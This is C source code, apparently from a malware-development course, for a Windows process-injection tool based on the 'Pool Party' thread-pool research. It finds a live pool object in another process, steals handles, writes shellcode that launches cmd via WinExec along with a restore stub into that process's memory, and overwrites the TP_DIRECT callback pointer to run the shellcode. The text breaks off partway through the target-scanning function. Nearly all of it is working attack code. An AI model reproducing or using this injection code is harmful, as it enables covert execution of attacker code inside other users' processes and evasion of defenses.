// Copyright 2026 MalDev Academy
// TpDirectCallbackHijack - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/TpDirectCallbackHijack
// 
// Hijacks the embedded TP_DIRECT.Callback of a live TP_IO / TP_ALPC / TP_JOB in a remote process to execute shellcode.
//
// Based on SafeBreach Labs' Pool Party research
//   Alon Leviev, Black Hat EU 2023
//   https://github.com/SafeBreach-Labs/PoolParty
//   https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/
//
// Combines ideas from several variants with an existing-pool-object hijack:
//
//   - Object kinds (TP_IO / TP_ALPC / TP_JOB) borrowed from variants 4 / 5 / 6
//   - TP_DIRECT.Callback dispatch primitive borrowed from variant 7
//   - NtSetIoCompletion trigger from variant 4 
//
// The published variants 4-7 each craft a fresh TP_<kind> structure and
// insert it into the target. This technique instead walks the target's
// live TP_POOL.PoolObjectList, finds a TP_IO / TP_ALPC / TP_JOB that is
// already there, and overwrites only the 8 bytes of its embedded
// TP_DIRECT.Callback field. A per-run restore stub puts the original
// Callback value back before the shellcode runs, so the hijacked pool
// object continues to dispatch normally after this one-shot execution.
//
// Flow:
//   (1) Resolve ntdll APIs via GetProcAddress.
//   (2) Scan the system for a target process meeting all of:
//         - 64-bit (not WoW64)
//         - has >=1 parked pool worker (ThreadState=Waiting && WaitReason=WrQueue)
//         - openable with VM_OPERATION | VM_READ | VM_WRITE | QUERY_INFORMATION | DUP_HANDLE
//         - exposes a TpWorkerFactory we can duplicate (-> TP_POOL VA)
//         - has at least one TP_IO / TP_ALPC / TP_JOB in that pool
//         - exposes an IoCompletion handle we can duplicate (-> dispatch)
//   (3) Allocate RW memory in the target.
//   (4) Write [restore stub | shellcode] via NtWriteVirtualMemory.
//   (5) Flip to RX via NtProtectVirtualMemory.
//   (6) Patch TP_DIRECT.Callback -> &restore-stub via NtWriteVirtualMemory.
//   (7) Fire a single completion packet via NtSetIoCompletion with
//       KeyContext = &TP_DIRECT.
//
// A parked pool worker dequeues the packet, reads TP_DIRECT.Callback (now the
// stub entry), and calls it with RCX = TP_DIRECT*. The stub restores the
// original Callback, falls through to the shellcode. After the shellcode's ret
// the TPP worker resumes its dispatch loop unharmed.
//


#include "Common.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _API_GLOBAL
{
    fnNtQuerySystemInformation         pNtQuerySystemInformation;
    fnNtOpenProcess                    pNtOpenProcess;
    fnNtQueryInformationProcess        pNtQueryInformationProcess;
    fnNtDuplicateObject                pNtDuplicateObject;
    fnNtClose                          pNtClose;
    fnNtQueryInformationWorkerFactory  pNtQueryInformationWorkerFactory;
    fnNtReadVirtualMemory              pNtReadVirtualMemory;
    fnNtWriteVirtualMemory             pNtWriteVirtualMemory;
    fnNtAllocateVirtualMemory          pNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory           pNtProtectVirtualMemory;
    fnNtSetIoCompletion                pNtSetIoCompletion;

    PVOID pTppIopCleanupGroupMemberVFuncs;    // ntdll VA; TP_IO   marker in TP_POOL.PoolObjectList
    PVOID pTppAlpcpCleanupGroupMemberVFuncs;  // ntdll VA; TP_ALPC marker
    PVOID pTppJobpCleanupGroupMemberVFuncs;   // ntdll VA; TP_JOB  marker

} API_GLOBAL, *PAPI_GLOBAL;

static API_GLOBAL g_APIs = { 0 };


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeNtApis(VOID)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
    {
        DBG("[!] GetModuleHandleW(ntdll.dll) Failed With Error: %lu", GetLastError());
        return FALSE;
    }

#define RESOLVE(FN)                                                                             \
    do {                                                                                        \
        g_APIs.p##FN = (fn##FN)GetProcAddress(hNtdll, #FN);                                     \
        if (!g_APIs.p##FN) {                                                                    \
            DBG("[!] GetProcAddress(%s) Failed With Error: %lu", #FN, GetLastError());          \
            return FALSE;                                                                       \
        }                                                                                       \
    } while (0)

    RESOLVE(NtQuerySystemInformation);
    RESOLVE(NtOpenProcess);
    RESOLVE(NtQueryInformationProcess);
    RESOLVE(NtDuplicateObject);
    RESOLVE(NtClose);
    RESOLVE(NtQueryInformationWorkerFactory);
    RESOLVE(NtReadVirtualMemory);
    RESOLVE(NtWriteVirtualMemory);
    RESOLVE(NtAllocateVirtualMemory);
    RESOLVE(NtProtectVirtualMemory);
    RESOLVE(NtSetIoCompletion);

#undef RESOLVE

    // Per-kind VFuncs tables are not exports; compute each VA as (ntdll base + RVA).
    g_APIs.pTppIopCleanupGroupMemberVFuncs   = (PVOID)((PBYTE)hNtdll + TPP_IOP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA);
    g_APIs.pTppAlpcpCleanupGroupMemberVFuncs = (PVOID)((PBYTE)hNtdll + TPP_ALPCP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA);
    g_APIs.pTppJobpCleanupGroupMemberVFuncs  = (PVOID)((PBYTE)hNtdll + TPP_JOBP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA);

    return TRUE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// x64 shellcode: calls kernel32!WinExec("cmd", 5). Follows the Win64 ABI -
// preserves nonvolatile registers (rbx/rsi/rdi/rbp/rsp) and returns cleanly
// so the caller resumes normally after it runs.

static UCHAR x64CmdShellcode[] =
{
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0x48, 0xC7,
    0xC2, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5C,
    0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//
// Restore stub emitted per-run, parameterized by:
//   (1) the ORIGINAL VALUE of TP_DIRECT.Callback (patched into data slot at +0x00,
//       fetched at runtime via RIP-relative lea + mov)
//   (2) the ABSOLUTE ADDRESS of &TP_DIRECT.Callback (baked as imm64 of the
//       "mov rcx, imm64" at +0x16)
//
// Layout (35 bytes):
//
//   [+0x00..+0x07] Data slot: original TP_DIRECT.Callback value (patched by EmitRestoreStub)
//   [+0x08]        push rax
//   [+0x09]        push rcx
//   [+0x0A]        lea  rax, [rip - 0x11]         ; rax = &data_slot
//   [+0x11]        mov  rax, [rax]                ; rax = original Callback value
//   [+0x14]        mov  rcx, imm64                ; rcx = &TP_DIRECT.Callback (patched by EmitRestoreStub)
//   [+0x1E]        mov  [rcx], rax                ; *(&TP_DIRECT.Callback) = original
//   [+0x21]        pop  rcx
//   [+0x22]        pop  rax
//   [+0x23]        (payload falls through here)
//
#define RESTORE_STUB_DATA_OFFSET            0x00    // Data slot (original Callback value, 8-byte patch target)
#define RESTORE_STUB_ENTRY_OFFSET           0x08    // Entry point (what we patch into TP_DIRECT.Callback)
#define RESTORE_STUB_IMM64_OFFSET           0x16    // imm64 inside "mov rcx, imm64" (8-byte patch target)

static CONST UCHAR g_RestoreStubTemplate[] =
{
    // [+0x00] Data slot: pOriginalCallback           (patched by EmitRestoreStub)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // [+0x08] push rax
    0x50,
    // [+0x09] push rcx
    0x51,
    // [+0x0A] lea rax, [rip - 0x11]                  ; rax = &data_slot
    0x48, 0x8D, 0x05, 0xEF, 0xFF, 0xFF, 0xFF,
    // [+0x11] mov rax, [rax]                         ; rax = *data_slot = original Callback
    0x48, 0x8B, 0x00,
    // [+0x14] mov rcx, imm64                         ; rcx = &TP_DIRECT.Callback (patched by EmitRestoreStub)
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // [+0x1E] mov [rcx], rax                         ; *(&TP_DIRECT.Callback) = rax = original
    0x48, 0x89, 0x01,
    // [+0x21] pop rcx
    0x59,
    // [+0x22] pop rax
    0x58,
};

static VOID EmitRestoreStub(OUT PBYTE pStub, IN PVOID pOriginalCallback, IN PVOID pTpDirectCallbackVA)
{
    RtlCopyMemory(pStub, g_RestoreStubTemplate, sizeof(g_RestoreStubTemplate));
    *(ULONGLONG*)(pStub + RESTORE_STUB_DATA_OFFSET)  = (ULONGLONG)(ULONG_PTR)pOriginalCallback;
    *(ULONGLONG*)(pStub + RESTORE_STUB_IMM64_OFFSET) = (ULONGLONG)(ULONG_PTR)pTpDirectCallbackVA;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//
// NtQuerySystemInformation wrapper that handles the dry-run + grow-and-retry
// loop. Allocates a buffer sized to the current snapshot and keeps growing it
// on STATUS_INFO_LENGTH_MISMATCH until the call succeeds.
//
static BOOL RunNtQuerySystemInformation(OUT PVOID* ppSystemInformation, IN SYSTEM_INFORMATION_CLASS SystemInformationClass)
{
    PVOID       pBuffer     = NULL;
    PVOID       pTmp        = NULL;
    ULONG       uBufferSize = 0x00;
    NTSTATUS    ntStatus    = STATUS_SUCCESS;
    BOOL        bResult     = FALSE;

    if (!ppSystemInformation)
        return FALSE;

    *ppSystemInformation = NULL;

    // Dry-run to size the buffer.
    ntStatus = g_APIs.pNtQuerySystemInformation(SystemInformationClass, NULL, 0, &uBufferSize);
    if (!NT_SUCCESS(ntStatus) && ntStatus != STATUS_INFO_LENGTH_MISMATCH)
    {
        DBG("[!] NtQuerySystemInformation Dry Run Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    if (!(pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uBufferSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    while (TRUE)
    {
        ntStatus = g_APIs.pNtQuerySystemInformation(SystemInformationClass, pBuffer, uBufferSize, &uBufferSize);
        if (ntStatus != STATUS_INFO_LENGTH_MISMATCH)
            break;

        uBufferSize *= 2;

        if (!(pTmp = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, uBufferSize)))
        {
            DBG("[!] HeapReAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }
        pBuffer = pTmp;
    }

    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    *ppSystemInformation = pBuffer;
    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && pBuffer)
        HeapFree(GetProcessHeap(), 0x00, pBuffer);
    return bResult;
}


//
// Scan a cached SystemExtendedHandleInformation buffer for the first handle in
// dwTargetPid whose kernel type index matches usTypeIndex, and duplicate it
// into our own process.
//
static HANDLE StealHandleOfIndexType(IN PSYSTEM_HANDLE_INFORMATION_EX pHandles, IN HANDLE hTargetProcess, IN DWORD dwTargetPid, IN USHORT usTypeIndex)
{
    PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX  pEntry      = NULL;
    HANDLE                              hStolen     = NULL;
    NTSTATUS                            ntStatus    = STATUS_SUCCESS;

    if (!pHandles || !hTargetProcess || !dwTargetPid)
        return NULL;

    for (ULONG_PTR i = 0; i < pHandles->NumberOfHandles; i++)
    {
        pEntry = &pHandles->Handles[i];

        if ((DWORD)(ULONG_PTR)pEntry->UniqueProcessId != dwTargetPid)
            continue;
        if (pEntry->ObjectTypeIndex != usTypeIndex)
            continue;

        ntStatus = g_APIs.pNtDuplicateObject(
            hTargetProcess,
            (HANDLE)pEntry->HandleValue,
            NtCurrentProcess(),
            &hStolen,
            0,
            0,
            DUPLICATE_SAME_ACCESS);

        if (NT_SUCCESS(ntStatus) && hStolen)
            return hStolen;

        hStolen = NULL;
    }

    return NULL;
}


//
// Pull the target's _TP_POOL VA out of a stolen TpWorkerFactory handle.
// ProcessId is used as a sanity check (bail if the handle didn't actually
// belong to the PID we thought it did).
//
static BOOL QueryWorkerFactoryTpPool(IN HANDLE hFactory, OUT PVOID* ppTpPoolVA, OUT PDWORD pdwFactoryPid)
{
    WORKER_FACTORY_BASIC_INFORMATION    Info        = { 0 };
    ULONG                               uReturned   = 0x00;
    NTSTATUS                            ntStatus    = STATUS_SUCCESS;

    if (!hFactory || !ppTpPoolVA || !pdwFactoryPid)
        return FALSE;

    ntStatus = g_APIs.pNtQueryInformationWorkerFactory(hFactory, WorkerFactoryBasicInformation, &Info, sizeof(Info), &uReturned);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQueryInformationWorkerFactory Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    *ppTpPoolVA     = Info.StartParameter;
    *pdwFactoryPid  = (DWORD)(ULONG_PTR)Info.ProcessId;

    DBG("[i] WorkerFactory 0x%p: PID=%lu TP_POOL=0x%p (Workers: Total=%lu Waiting=%lu)",
        hFactory, (DWORD)(ULONG_PTR)Info.ProcessId, Info.StartParameter,
        Info.TotalWorkerCount, Info.WaitingWorkerCount);

    return (Info.StartParameter != NULL) ? TRUE : FALSE;
}


//
// Read exactly 8 bytes from the remote process via NtReadVirtualMemory.
//
static BOOL ReadRemoteQword(IN HANDLE hProcess, IN PVOID pRemoteAddress, OUT PULONGLONG pOutValue)
{
    SIZE_T      cbBytesRead = 0x00;
    NTSTATUS    ntStatus    = STATUS_SUCCESS;

    ntStatus = g_APIs.pNtReadVirtualMemory(hProcess, pRemoteAddress, pOutValue, sizeof(ULONGLONG), &cbBytesRead);
    if (!NT_SUCCESS(ntStatus) || cbBytesRead != sizeof(ULONGLONG))
    {
        DBG("[!] NtReadVirtualMemory Failed With Error: 0x%0.8X (Read %lu/%lu @ 0x%p)",
            ntStatus, (ULONG)cbBytesRead, (ULONG)sizeof(ULONGLONG), pRemoteAddress);
        return FALSE;
    }
    return TRUE;
}


//
// Walk the target's TP_POOL.PoolObjectList looking for a TP_IO, TP_ALPC or
// TP_JOB (classified via CleanupGroupMember.VFuncs against the three per-kind
// TppXpCleanupGroupMemberVFuncs tables). 
//
static BOOL FindPoolObjectInTargetPool(
    IN  HANDLE          hProcess,                   // Target process handle (needs PROCESS_VM_READ for the pool walk)
    IN  PVOID           pTpPoolVA,                  // Target's _TP_POOL base VA (from WorkerFactory StartParameter)
    OUT TP_OBJECT_KIND* pKind,                      // Output parameter representing the matched kind: TpObjectKindIo / TpObjectKindAlpc / TpObjectKindJob
    OUT PVOID*          ppOuterBase,                // Output parameter representing the VA of the outer TP_IO / TP_ALPC / TP_JOB struct in the target
    OUT PVOID*          ppTpDirectVA,               // Output parameter representing the VA of &outer.Direct. This becomes KeyContext for NtSetIoCompletion, so that TppWorkerThread's dispatch loop treats the delivered packet as a TP_DIRECT and invokes its Callback field (now pointing at our restore stub) with RCX = &TP_DIRECT
    OUT PVOID*          ppTpDirectCallbackVA,       // Output parameter representing the VA of &outer.Direct.Callback. This is the 8-byte field we overwrite
    OUT PVOID*          ppOriginalCallback)         // Output parameter representing the current value at *ppTpDirectCallbackVA, which is patched into the restore stub to put the original dispatch routine back in place before our shellcode runs
{
    ULONGLONG       ullPoolListHeadVA           = 0x00,
                    ullWalkCursorVA             = 0x00,
                    ullNextFlinkVA              = 0x00,
                    ullCurrentCgmBaseVA         = 0x00,
                    ullCurrentCgmVFuncs         = 0x00,
                    ullFoundOuterBaseVA         = 0x00,
                    ullFoundDirectVA            = 0x00,
                    ullTpDirectCallbackFieldVA  = 0x00,
                    ullOriginalCallbackValue    = 0x00;
    PVOID           pPoolObjectListHead         = NULL;
    ULONG           uWalkIterations             = 0x00,
                    uCgmOffsetInOuter           = 0x00,
                    uDirectOffsetInOuter        = 0x00;
    TP_OBJECT_KIND  Kind                        = TpObjectKindNone;

    if (!hProcess || !pTpPoolVA || !pKind || !ppOuterBase || !ppTpDirectVA || !ppTpDirectCallbackVA || !ppOriginalCallback)
        return FALSE;

    *pKind                = TpObjectKindNone;
    *ppOuterBase          = NULL;
    *ppTpDirectVA         = NULL;
    *ppTpDirectCallbackVA = NULL;
    *ppOriginalCallback   = NULL;

    pPoolObjectListHead = (PVOID)((ULONG_PTR)pTpPoolVA + offsetof(TP_POOL, PoolObjectList));
    ullPoolListHeadVA   = (ULONGLONG)(ULONG_PTR)pPoolObjectListHead;

    if (!ReadRemoteQword(hProcess, pPoolObjectListHead, &ullNextFlinkVA))
        return FALSE;

    DBG("[i] Walking PoolObjectList @ 0x%p (First Flink=0x%p)", pPoolObjectListHead, (PVOID)(ULONG_PTR)ullNextFlinkVA);

    ullWalkCursorVA = ullNextFlinkVA;

    while (ullWalkCursorVA != 0x00 && ullWalkCursorVA != ullPoolListHeadVA && uWalkIterations < POOL_OBJECT_LIST_MAX_ITER)
    {
        ullCurrentCgmBaseVA = ullWalkCursorVA - offsetof(TPP_CLEANUP_GROUP_MEMBER, PoolObjectLinks);

        if (!ReadRemoteQword(hProcess, (PVOID)(ullCurrentCgmBaseVA + offsetof(TPP_CLEANUP_GROUP_MEMBER, VFuncs)), &ullCurrentCgmVFuncs))
            return FALSE;

        Kind = TpObjectKindNone;
        if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_APIs.pTppIopCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindIo;
            uCgmOffsetInOuter    = offsetof(TP_IO,   CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_IO,   Direct);
        }
        else if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_APIs.pTppAlpcpCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindAlpc;
            uCgmOffsetInOuter    = offsetof(TP_ALPC, CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_ALPC, Direct);
        }
        else if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_APIs.pTppJobpCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindJob;
            uCgmOffsetInOuter    = offsetof(TP_JOB,  CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_JOB,  Direct);
        }

        if (Kind != TpObjectKindNone)
        {
            ullFoundOuterBaseVA        = ullCurrentCgmBaseVA - uCgmOffsetInOuter;
            ullFoundDirectVA           = ullFoundOuterBaseVA + uDirectOffsetInOuter;
            ullTpDirectCallbackFieldVA = ullFoundDirectVA + offsetof(TP_DIRECT, Callback);

            if (!ReadRemoteQword(hProcess, (PVOID)ullTpDirectCallbackFieldVA, &ullOriginalCallbackValue))
                return FALSE;

            *pKind                = Kind;
            *ppOuterBase          = (PVOID)ullFoundOuterBaseVA;
            *ppTpDirectVA         = (PVOID)ullFoundDirectVA;
            *ppTpDirectCallbackVA = (PVOID)ullTpDirectCallbackFieldVA;
            *ppOriginalCallback   = (PVOID)ullOriginalCallbackValue;

            DBG("[+] Found %s @ 0x%p [After %lu Iterations]; &TP_DIRECT.Callback=0x%p; OriginalCallback=0x%p",
                (Kind == TpObjectKindIo)   ? "TP_IO"   :
                (Kind == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB",
                (PVOID)(ULONG_PTR)ullFoundOuterBaseVA,
                uWalkIterations,
                (PVOID)(ULONG_PTR)ullTpDirectCallbackFieldVA,
                (PVOID)(ULONG_PTR)ullOriginalCallbackValue);

            return TRUE;
        }

        if (!ReadRemoteQword(hProcess, (PVOID)ullWalkCursorVA, &ullNextFlinkVA))
            return FALSE;

        ullWalkCursorVA = ullNextFlinkVA;
        uWalkIterations++;
    }

    DBG("[-] Walked %lu PoolObjectList Node(s). No TP_IO / TP_ALPC / TP_JOB Was Found", uWalkIterations);
    return FALSE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

//
// Scan the system for a candidate target meeting every criterion:
//   (a) 64-bit (not WoW64)
//   (b) has >=1 WrQueue-parked thread (worker ready to dispatch our packet)
//   (c) openable with the needed access rights
//   (d) exposes a TpWorkerFactory we can duplicate (-> TP_POOL VA)
//   (e) has at least one TP_IO / TP_ALPC / TP_JOB in that pool
//   (f) exposes an IoCompletion handle we can duplicate (-> dispatch)
//
// First match wins; the scan returns the target's handles + pool-object info.
//
static BOOL FindTpInjectTargetProcess(
    OUT TP_OBJECT_KIND* pKind,                      // Output parameter representing the matched kind. Fetched from FindPoolObjectInTargetPool.
    OUT PDWORD          pdwProcessId,               // Output parameter representing the target process's PID
    OUT PHANDLE         phProcess,                  // Output parameter representing a handle to the target process.
    OUT PHANDLE         phIoCompletion,             // Output parameter representing a duplicated handle to one of the target's IoCompletion objects, used later to fire the dispatch packet via NtSetIoCompletion. 
    OUT PVOID*          ppTpDirectVA,               // Output parameter representing the VA of &outer.Direct in the target. Fetched from FindPoolObjectInTargetPool.
    OUT PVOID*          ppTpDirectCallbackVA,       // Output parameter representing the VA of &outer.Direct.Callback in the target. Fetched from FindPoolObjectInTargetPool.
    OUT PVOID*          ppOriginalCallback,         // Output parameter representing the current value at *ppTpDirectCallbackVA. Fetched from FindPoolObjectInTargetPool.
    OUT LPWSTR          wszProcessName OPTIONAL)    // Optional output parameter representing the target's image name (e.g. "nvcontainer.exe"). Caller-provided buffer, assumed MAX_PATH wide chars
{
    BOOL                            bResult             = FALSE;
    NTSTATUS                        ntStatus            = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION     pSystemProcInfo     = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX   pHandleCache        = NULL;
    DWORD                           dwCurrentProcessId  = GetCurrentProcessId();
    PSYSTEM_PROCESS_INFORMATION     pCurrentProcInfo    = NULL;

    if (!pKind || !pdwProcessId || !phProcess || !phIoCompletion || !ppTpDirectVA || !ppTpDirectCallbackVA || !ppOriginalCallback)
        return FALSE;

    if (!RunNtQuerySystemInformation((PVOID*)&pSystemProcInfo, SystemProcessInformation))
    {
        DBG("[!] RunNtQuerySystemInformation [SystemProcessInformation] Failed");
        goto _END_OF_FUNC;
    }
    if (!RunNtQuerySystemInformation((PVOID*)&pHandleCache, SystemExtendedHandleInformation))
    {
        DBG("[!] RunNtQuerySystemInformation [SystemExtendedHandleInformation] Failed");
        goto _END_OF_FUNC;
    }

    *pKind                = TpObjectKindNone;
    *pdwProcessId         = 0x00;
    *phProcess            = NULL;
    *phIoCompletion       = NULL;
    *ppTpDirectVA         = NULL;
    *ppTpDirectCallbackVA = NULL;
    *ppOriginalCallback   = NULL;
    pCurrentProcInfo      = pSystemProcInfo;

    while (TRUE)
    {
        HANDLE              hCandidateProcess       = NULL,
                            hStolenWorkerFactory    = NULL,
                            hStolenIoCompletion     = NULL;
        DWORD               dwCurrentPid            = (DWORD)(ULONG_PTR)pCurrentProcInfo->UniqueProcessId;
        DWORD               dwCurrentTid            = 0x00;
        LPCWSTR             pwszImageName           = (pCurrentProcInfo->ImageName.Buffer ? pCurrentProcInfo->ImageName.Buffer : L"<unknown>");
        BOOL                bHasParkedWorker        = FALSE;
        OBJECT_ATTRIBUTES   ObjAttr                 = { 0 };
        CLIENT_ID           ClientId                = { 0 };
        ULONG_PTR           ullWow64PebAddress      = 0x00;
        ULONG               uReturnedLength         = 0x00;
        PVOID               pTpPoolVA               = NULL;
        DWORD               dwFactoryPid            = 0x00;
        TP_OBJECT_KIND      MatchedKind             = TpObjectKindNone;
        PVOID               pOuterBase              = NULL;
        PVOID               pTpDirectVA             = NULL;
        PVOID               pTpDirectCallbackVA     = NULL;
        PVOID               pOriginalCallback       = NULL;

        // Skip System Idle (PID 0), System (PID 4), and ourselves.
        if (dwCurrentPid <= 0x04 || dwCurrentPid == dwCurrentProcessId)
            goto _NEXT_PROCESS;

        // (b) At least one WrQueue-parked thread (worker ready to dispatch).
        for (ULONG uThreadIdx = 0; uThreadIdx < pCurrentProcInfo->NumberOfThreads; uThreadIdx++)
        {
            PSYSTEM_THREAD_INFORMATION pThreadInfo = &pCurrentProcInfo->ThreadInfos[uThreadIdx];

            if (pThreadInfo->ThreadState == Waiting && pThreadInfo->WaitReason == WrQueue)
            {
                dwCurrentTid = (DWORD)(ULONG_PTR)pThreadInfo->ClientId.UniqueThread;
                bHasParkedWorker = TRUE;
                break;
            }
        }
        if (!bHasParkedWorker)
            goto _NEXT_PROCESS;

        // (c) Open the process with every right we'll need downstream.
        InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
        ClientId.UniqueProcess = pCurrentProcInfo->UniqueProcessId;
        ClientId.UniqueThread  = NULL;

        ntStatus = g_APIs.pNtOpenProcess(&hCandidateProcess,
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
            &ObjAttr, &ClientId);
        if (!NT_SUCCESS(ntStatus) || !hCandidateProcess)
        {
            if (ntStatus != STATUS_ACCESS_DENIED)
                DBG("[!] NtOpenProcess Failed For %ws (%lu) With Error: 0x%0.8X", pwszImageName, dwCurrentPid, ntStatus);
            goto _NEXT_PROCESS;
        }

        // (a) Must be 64-bit (ProcessWow64Information returns NULL for native x64).
        ntStatus = g_APIs.pNtQueryInformationProcess(hCandidateProcess, ProcessWow64Information, &ullWow64PebAddress, sizeof(ULONG_PTR), &uReturnedLength);
        if (!NT_SUCCESS(ntStatus) || ullWow64PebAddress != 0x00)
            goto _CLOSE_PROC_AND_CONTINUE;

        // (d) Steal a TpWorkerFactory handle and extract the TP_POOL VA.
        if (!(hStolenWorkerFactory = StealHandleOfIndexType(pHandleCache, hCandidateProcess, dwCurrentPid, (USHORT)ObTypeIndexTpWorkerFactory)))
        {
            DBG("[!] StealHandleOfIndexType Found No Duplicatable TpWorkerFactory Handle For %ws (PID:%lu)",
                pwszImageName, dwCurrentPid);
            goto _CLOSE_PROC_AND_CONTINUE;
        }

        // Pull the TP_POOL VA out of the stolen WorkerFactory, and sanity-check
        // that the factory's ProcessId matches the PID we stole the handle from.
        if (!QueryWorkerFactoryTpPool(hStolenWorkerFactory, &pTpPoolVA, &dwFactoryPid) || dwFactoryPid != dwCurrentPid)
        {
            DBG("[!] QueryWorkerFactoryTpPool Failed For %ws (PID:%lu, TP_POOL=0x%p, FactoryPid=%lu)",
                pwszImageName, dwCurrentPid, pTpPoolVA, dwFactoryPid);
            goto _CLOSE_FACTORY_AND_CONTINUE;
        }

        // Done with the WorkerFactory, we only needed it to read the TP_POOL VA.
        (VOID)g_APIs.pNtClose(hStolenWorkerFactory);
        hStolenWorkerFactory = NULL;

        // (e) Walk the pool for a TP_IO / TP_ALPC / TP_JOB.
        if (!FindPoolObjectInTargetPool(hCandidateProcess, pTpPoolVA, &MatchedKind, &pOuterBase, &pTpDirectVA, &pTpDirectCallbackVA, &pOriginalCallback))
            goto _CLOSE_PROC_AND_CONTINUE;

        // (f) Steal an IoCompletion handle (so we can fire the dispatch packet).
        if (!(hStolenIoCompletion = StealHandleOfIndexType(pHandleCache, hCandidateProcess, dwCurrentPid, (USHORT)ObTypeIndexIoCompletion)))
        {
            DBG("[!] StealHandleOfIndexType Found No Duplicatable IoCompletion Handle For %ws (PID:%lu)",
                pwszImageName, dwCurrentPid);
            goto _CLOSE_PROC_AND_CONTINUE;
        }

        // All criteria met. Populate output parameters
        *pKind                = MatchedKind;
        *phProcess            = hCandidateProcess;
        *phIoCompletion       = hStolenIoCompletion;
        *pdwProcessId         = dwCurrentPid;
        *ppTpDirectVA         = pTpDirectVA;
        *ppTpDirectCallbackVA = pTpDirectCallbackVA;
        *ppOriginalCallback   = pOriginalCallback;

        if (wszProcessName && pCurrentProcInfo->ImageName.Buffer)
            lstrcpyW(wszProcessName, pCurrentProcInfo->ImageName.Buffer);

        DBG("[+] Target Accepted: %ws (PID:%lu, TID:%lu, Kind=%s)",
            pwszImageName, dwCurrentPid, dwCurrentTid,
            (MatchedKind == TpObjectKindIo)   ? "TP_IO"   :
            (MatchedKind == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB");
        /*
        DBG("[v] hProcess=0x%p hIoCompletion=0x%p", hCandidateProcess, hStolenIoCompletion);
        DBG("[v] OuterBase=0x%p &TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p OriginalCallback=0x%p",
            pOuterBase, pTpDirectVA, pTpDirectCallbackVA, pOriginalCallback);
        */

        bResult = TRUE;
        goto _END_OF_FUNC;

